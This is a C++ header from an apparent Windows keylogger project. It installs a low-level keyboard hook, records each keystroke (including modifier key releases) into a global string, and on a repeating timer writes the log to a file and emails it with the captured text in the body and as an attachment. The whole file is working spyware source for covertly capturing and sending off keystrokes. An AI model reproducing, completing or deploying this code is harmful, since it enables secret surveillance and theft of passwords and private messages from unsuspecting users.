 #ifndef KEYBHOOK_H
 #define KEYBHOOK_H

 #include <iostream>
 #include <fstream>
 #include "windows.h"
 #include "KeyConstants.h"
 #include "Timer.h"
 #include "SendMail.h"

 std::string keylog = ""; // This variable holds all the logged keystrokes

 void TimerSendMail() {

    if(keylog.empty()) {

        return;
    }

    std::string last_file = IO::WriteLog(keylog);

    if(last_file.empty()) {

        Helper::WriteAppLog("File creation was not successful. Keylog '" + keylog + "'");
        return;
    }

    //First argument is the subject
    //Second argument is the body
    //Third argument is the attachment
    int x = Mail::SendMail("Log [" + last_file + "]",
                           "Oh hi Mark! :)\nThe file has been attached to this email\nFor testing purposes \n"
                           "Content of the file:\n\n------------------\n" + keylog,
                           IO::GetOurPath(true) + last_file);

    //In case mail sending has failed
    //inform the user
    if(x != 7) { //If the mail sending fails
        Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(x));
    }
    else {
        keylog = ""; // otherwise we clear the string content because we won't need it again in the future
    }
}


Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite); // 500 ms for testing, originally 2000 ms

HHOOK eHook = NULL; // pointer to our hook

// this function can be used to "forbid" keys from the keyboard, so they are not logged or recorded when pressed
LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {

    if(nCode < 0) {
        CallNextHookEx(eHook, nCode, wparam, lparam);
    }

    // search on Internet for KBDLLHOOKSTRUCT
    // pointer of type KBDLLHOOKSTRUCT
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;

    // this if statement checks if the user pressed and holding a key
    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {

        // will access list of constants in Key.Constants.h and turn
        // the received data into readable user friendly data
        keylog += Keys::KEYS[kbs->vkCode].Name;

        // prints a new line when user presses enter key
        if(kbs->vkCode == VK_RETURN) {

            keylog += '\n';
        }
    }

    // this if statement checks if the user released system keys
    // for example [SHIFT][a][b][c][/SHIFT][d][c], we know that [a][b][c] are upper-case
    else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {

        DWORD key = kbs->vkCode;

        if(key == VK_CONTROL
               || key == VK_LCONTROL
               || key == VK_RCONTROL
               || key == VK_SHIFT
               || key == VK_RSHIFT
               || key == VK_LSHIFT
               || key == VK_MENU
               || key == VK_LMENU
               || key == VK_RMENU
               || key == VK_CAPITAL
               || key == VK_NUMLOCK
               || key == VK_LWIN
               || key == VK_RWIN) {

            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1, "/"); // inserting backslash in for example: [SHIFT]...[/SHIFT]
            keylog += KeyName;
        }
    }
    return CallNextHookEx(eHook, nCode, wparam, lparam); // return to the system
}

bool InstallHook() {

    Helper::WriteAppLog("Hook Started... Timer Started");
    MailTimer.Start(true);

    // search this function (SetWindowsHookEx)
    // to understand and develop proper documentation
    // LL is short for "Low Level"
    // last parameter means DWORD = 0
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc,
                             GetModuleHandle(NULL), 0);

    return eHook == NULL;
}

// doesn't kill the keylogger, it simply uninstalls the hook
bool UninstallHook() {

    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool)b;
}

bool isHooked() {

    return (bool)(eHook == NULL);
}

#endif // KEYBHOOK_H
